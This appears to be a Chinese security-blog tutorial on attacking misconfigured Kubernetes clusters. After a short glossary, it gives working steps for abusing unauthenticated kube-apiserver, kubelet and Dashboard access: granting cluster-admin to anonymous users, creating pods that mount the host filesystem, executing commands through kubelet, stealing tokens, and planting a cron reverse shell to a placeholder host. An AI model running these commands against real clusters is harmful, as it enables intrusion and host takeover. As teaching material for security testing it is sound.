#  K8s下的漏洞挖掘思路   
原创 Sumor  网络安全学习笔记   2025-04-23 07:26  
  
   
  
## 0x01 概念  
  
**容器**  
：容器是一种虚拟技术，与传统的虚拟机（如VMware）相比，容器更加轻量化，不需要虚拟整出个操作系统，仅需要虚拟一个小规模的环境就可以运行，容器以独立进程的方式运行在宿主机上，相互之间共享系统内核。Docker是使用最为广泛的容器技术，只需要将应用程序以及相关依赖关系进行打包，就可以在不同服务器上进行部署运行，并且提供一个与宿主机相互隔离的虚拟环境。  
  
**K8s**  
：全称是kubernetes，是谷歌在2014年推出的一种开源容器编排系统，因将k后面的8个字母进行缩写后被广泛简称为K8s，随着容器技术的发展，面临着容器数量庞大、难以管理的问题，K8s的推出很好的解决了这一问题，并且在容器编排系统中占据领先地位。  
  
**Pod**  
：K8s中运行的最小调度单元被称为Pod，一个Pod上运行着一个或多个容器，并且在K8s中，每个Pod都会被分配一个虚拟的IP和端口，以确保内部任意两个Pod之间可以直接通信。  
  
**Service**  
：K8s中用于具体实现客户端与每个Pod之间通信的一个资源对象，Service一旦被创建，K8s就会为其分配一个集群内唯一、固定不变的虚拟IP地址，叫做ClusterIP（集群IP），并且在K8s中建立了一个不同ClusterIP到服务名的DNS域名映射关系，这样其他Pod或Service就可以通过服务名的方式访问这个Service，而不用知道其具体的ClusterIP。  
  
**Label**  
：标签，由键值对组成，K8s中用于标记Pod或Service。Service通过Label来寻找到具体的Pod或这个Pod的副本集。Label与被标记的对象是一对多的关系。  
  
**Replica Set**  
：K8s中的一个控制器对象，用于动态调整集群中的Pod副本数量，若实际Pod副本数量大于预期，RS(Reploca Set)则会删除超出的Pod副本，反之，RS会自动创建一个Pod副本。  
  
**kube-apiserver**  
：K8s API的主要组件，是K8s前端的统一接口，也是所有服务的唯一入口，提供了认证、授权、访问控制等机制。  
  
**kube-proxy**  
: 客户端对Service的请求，都将通过kube-proxy转发到对应的Pod上  
  
**kubelet**  
：K8s中运行在工作节点上的一个代理组件，kubelet的API为10250端口，负责与kube apiserver通信，包括从apiserver接收指令、监控上报运行状态等。  
## 0x02 K8s kube-apiserver未授权漏洞  
  
K8s在部署完后会启动两个默认端口用于提供API服务：  
  
6443: secure-port  
  
8080: insecure-port  
### 1、6443端口未授权访问  
  
正常情况下，直接访问6443端口会提示未授权：  
  
![](https://mmbiz.qpic.cn/mmbiz_jpg/Q11SaBKBJunqxljhhqonXic7EsnlaDaRegzUxnY9Hbxe6C40GRxmHYRWtOSNGFOw6kjVxT7VzGvib70TiblKuvDWQ/640?wx_fmt=jpeg&from=appmsg "")  
  
若存在配置错误，将 system:anonymous 用户绑定到cluster-admin用户组，或者获取到认证证书等，可以直接访问6443端口，向集群内部下发指令。  
  
kubectl create clusterrolebinding system:anonymous --clusterrole=cluster-admin --user=system:anonymous  
  
![](https://mmbiz.qpic.cn/mmbiz_jpg/Q11SaBKBJunqxljhhqonXic7EsnlaDaReqH9CvKiaUdAAicRpnjyqzesvIiaQSE5l6VvfPU4YnyXEX66onNJVIqGcg/640?wx_fmt=jpeg&from=appmsg "")  
  
访问https://IP:6443/api/v1/namespaces/default/pods 获取所有Pod列表  
  
![](https://mmbiz.qpic.cn/mmbiz_jpg/Q11SaBKBJunqxljhhqonXic7EsnlaDaRedNyfe7pghib3FjMYgY9lLgJymoKVc4n0cCic8QVrRBr3edNhMmZ4zScw/640?wx_fmt=jpeg&from=appmsg "")  
  
访问/api/v1/namespaces/kube-system/secrets/获取token  
  
![](https://mmbiz.qpic.cn/mmbiz_jpg/Q11SaBKBJunqxljhhqonXic7EsnlaDaReA2T3LghGl78tUmS6mILql4WRULzb4iaDgKCliaRJNNiaial1dZnHDVO2OA/640?wx_fmt=jpeg&from=appmsg "")  
  
创建特权容器：  
```
POST /api/v1/namespaces/default/pods HTTP/1.1Host: x.x.x.x:6443Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2Accept-Encoding: gzip, deflateUpgrade-Insecure-Requests: 1Sec-Fetch-Dest: documentSec-Fetch-Mode: navigateSec-Fetch-Site: noneSec-Fetch-User: ?1Te: trailersContent-Length: 695{"apiVersion":"v1","kind":"Pod","metadata":{"annotations":{"kubectl.kubernetes.io/last-applied-configuration":"{\"apiVersion\":\"v1\",\"kind\":\"Pod\",\"metadata\":{\"annotations\":{},\"name\":\"sectest\",\"namespace\":\"default\"},\"spec\":{\"containers\":[{\"image\":\"nginx:1.14.1\",\"name\":\"sectest\",\"volumeMounts\":[{\"mountPath\":\"/host\",\"name\":\"host\"}]}],\"volumes\":[{\"hostPath\":{\"path\":\"/\",\"type\":\"Directory\"},\"name\":\"host\"}]}}\n"},"name":"sectest","namespace":"default"},"spec":{"containers":[{"image":"nginx:1.14.1","name":"sectest","volumeMounts":[{"mountPath":"/host","name":"host"}]}],"volumes":[{"hostPath":{"path":"/","type":"Directory"},"name":"host"}]}}
```  
  
![](https://mmbiz.qpic.cn/mmbiz_jpg/Q11SaBKBJunqxljhhqonXic7EsnlaDaReqfH5PSP64zoh3aorYTiaXg3nhWWmwHbwnd3L9pqyx8YntaNJ4Ziceytg/640?wx_fmt=jpeg&from=appmsg "")  
  
可以看到Pod创建成功：  
  
![](https://mmbiz.qpic.cn/mmbiz_jpg/Q11SaBKBJunqxljhhqonXic7EsnlaDaReY04usiaDy4I1JOBE7CzhiahnYUOsWicTgGxg7F8brsLNwiaYgvzpoDrDvQ/640?wx_fmt=jpeg&from=appmsg "")  
  
使用kubectl查看所有Pod：  
  
kubectl.exe --insecure-skip-tls-verify -s https://IP:6443 get pods --all-namespaces  
  
用户名和密码随意输入  
  
![](https://mmbiz.qpic.cn/mmbiz_jpg/Q11SaBKBJunqxljhhqonXic7EsnlaDaRe25hicNShic2JWKtB5icwowPrZFoF0lGpfhKF26sM4qJAwUXicb1Wq2ILLg/640?wx_fmt=jpeg&from=appmsg "")  
  
查看所有Pod状态：  
  
kubectl.exe --insecure-skip-tls-verify -s https://IP:6443 describe pod --all-namespaces  
  
如果运行出错，可以通过logs查看日志：  
  
kubectl.exe --insecure-skip-tls-verify -s https://IP:6443 logs sectest  
  
获取bash：  
  
kubectl.exe --insecure-skip-tls-verify -s https://IP:6443 --namespace=default exec -it sectest -- bash  
  
通过chroot到宿主机，写入/root/.bashrc，待下次ssh登录时获取宿主机权限  
  
![](https://mmbiz.qpic.cn/mmbiz_jpg/Q11SaBKBJunqxljhhqonXic7EsnlaDaReTicJFm7fN215LdchnsDPZ2Zeb2SurnqFlxww5YbNbicm9ibz0JhLn4dwg/640?wx_fmt=jpeg&from=appmsg "")  
  
  
![](https://mmbiz.qpic.cn/mmbiz_jpg/Q11SaBKBJunqxljhhqonXic7EsnlaDaRenF1b75ibzScgYKTKyZqQ4Inupk1HA8qbncbCMHD0cf1FXzEXOQ5VBicA/640?wx_fmt=jpeg&from=appmsg "")  
## 0x03 kubelet API未授权访问  
  
10250端口是kubelet API监听端口，负责从kube-apiserver接收指令和上报状态信息。  
  
正常访问10250端口提示未认证  
  
![](https://mmbiz.qpic.cn/mmbiz_jpg/Q11SaBKBJunqxljhhqonXic7EsnlaDaReGZkOgScv38ibNHTIh4HdgBEj2bgmhXVxLy7vcpDzAL92GI2Y9w2RmxA/640?wx_fmt=jpeg&from=appmsg "")  
  
若配置文件中启用匿名访问，则会导致10250端口未授权  
  
/var/lib/kubelet/config.yaml  
  
![](https://mmbiz.qpic.cn/mmbiz_jpg/Q11SaBKBJunqxljhhqonXic7EsnlaDaRemPVgE3AVXMTDaqsZkmm5n0zkS2zsRl6MB9PeO7GveJQ1vvjatlM7PA/640?wx_fmt=jpeg&from=appmsg "")  
  
  
![](https://mmbiz.qpic.cn/mmbiz_jpg/Q11SaBKBJunqxljhhqonXic7EsnlaDaRe5pgYe1YC6cAxcLjkTicLRHR76LPJ51TPUhKUFvkMf0sibH1GfiaVu4ukQ/640?wx_fmt=jpeg&from=appmsg "")  
  
通过https://IP:10250/runningpods/ 获取三个参数：  
> namespace：对应metadata.namespace  
  
pod：对应metadata.name  
  
container:对应spec.containers.0.name  
  
  
  
![](https://mmbiz.qpic.cn/mmbiz_jpg/Q11SaBKBJunqxljhhqonXic7EsnlaDaReUU0cQtHvjmeiaRvmzI4ficDXQkY2hxf9ECUJCZaCf5eeMGBHrtB8cjCQ/640?wx_fmt=jpeg&from=appmsg "")  
  
执行命令：  
```
POST /run/<namespace>/<pod>/<postgres> HTTP/1.1Host: x.x.x.x:10250User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/113.0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2Accept-Encoding: gzip, deflateConnection: closeUpgrade-Insecure-Requests: 1Sec-Fetch-Dest: documentSec-Fetch-Mode: navigateSec-Fetch-Site: noneSec-Fetch-User: ?1Content-Type: application/x-www-form-urlencodedContent-Length: 10cmd=whoami
```  
  
![](https://mmbiz.qpic.cn/mmbiz_jpg/Q11SaBKBJunqxljhhqonXic7EsnlaDaRefceh38TJjCCEHia4wsAE5Nudc8w4Pvme38cf0qicOlgmngf1yr2Wj42Q/640?wx_fmt=jpeg&from=appmsg "")  
## 0x04 Dashboard未授权访问  
  
K8s的Dashboard是以基于网页的K8s用户界面，用户可获得运行在集群中应用的概览信息，并且图形化操纵K8s资源。Dashboard默认不安装，并且手动安装后只能通过执行了kubectl proxy  
的机器进行访问，但是当使用的Dashboard配置不当，或者部署低版本的Dashboard时选择了"跳过"选项，可能会导致一些未授权访问漏洞，此外，通过K8s API，或者集群的单点登录等方式访问Dashboard。  
  
通过6443端口进行访问：  
  
https://IP:6443/api/v1/namespaces/kubernetes-dashboard/services/https:kubernetes-dashboard:/proxy/#/workloads?namespace=default  
  
![](https://mmbiz.qpic.cn/mmbiz_png/Q11SaBKBJunqxljhhqonXic7EsnlaDaReQ8oqciac3iaNbgSjsASIdznnfHkktZPlj1Fxknx1tYlVGqSP7obc3ueg/640?wx_fmt=png&from=appmsg "")  
  
创建一个特权Pod，并且挂载宿主机根路径到/sechost下  
  
配置文件：  
```
apiVersion: v1kind: Podmetadata:  name: sectest1spec:  containers:  - name: hostpath-container    image: nginx:1.14.1    volumeMounts:    - name: hostpath-volume      mountPath: /sechost  volumes:  - name: hostpath-volume    hostPath:      path: /
```  
  
![](https://mmbiz.qpic.cn/mmbiz_png/Q11SaBKBJunqxljhhqonXic7EsnlaDaReS5cNqFMlNylJynBZaIScDnibytc1Dvh1KpPrVxI8ibT7kB5Rg3SC1nTA/640?wx_fmt=png&from=appmsg "")  
  
选择创建的Pod，点击执行  
  
![](https://mmbiz.qpic.cn/mmbiz_png/Q11SaBKBJunqxljhhqonXic7EsnlaDaRemYb2MJicYENwIia8PQjTeWicRFAtPcCw9m6CNaPXujYR1zMQpdt6MDiauQ/640?wx_fmt=png&from=appmsg "")  
  
通过计划任务获得宿主机shell  
```
chroot sechostecho 'bash -i >& /dev/tcp/x.x.x.x/2333 0>&1' > /etc/cron.hourly/test.shchmod +x /etc/cron.hourly/test.sh
```  
  
![](https://mmbiz.qpic.cn/mmbiz_png/Q11SaBKBJunqxljhhqonXic7EsnlaDaRefq0P8SNcvvk1rr1nP1ZlLsjoXhkOhiaqiaopJkvUtFbibkBfgcRb2PQJw/640?wx_fmt=png&from=appmsg "")  
  
或者直接进入特权容器，特权容器可以挂载宿主机磁盘路径到容器中。  
```
fdisk -lmkdir /sechostmount /dev/dm-0 /sechost/chroot /sechost/
```  
  
![](https://mmbiz.qpic.cn/mmbiz_png/Q11SaBKBJunqxljhhqonXic7EsnlaDaReYetvYVau9ibPYFUp8DqBicZ5eNr93rKibvALwJq5dBbGt60r9EHY31d8w/640?wx_fmt=png&from=appmsg "")  
## 0x05 参考  
  
https://kubernetes.io/zh-cn/docs/concepts/overview/working-with-objects/  
  
https://zhuanlan.zhihu.com/p/97605697  
  
https://zhuanlan.zhihu.com/p/365759073  
  
https://www.jianshu.com/p/477974212ba8  
  
https://cloud.tencent.com/developer/article/2000490  
  
   
  
  
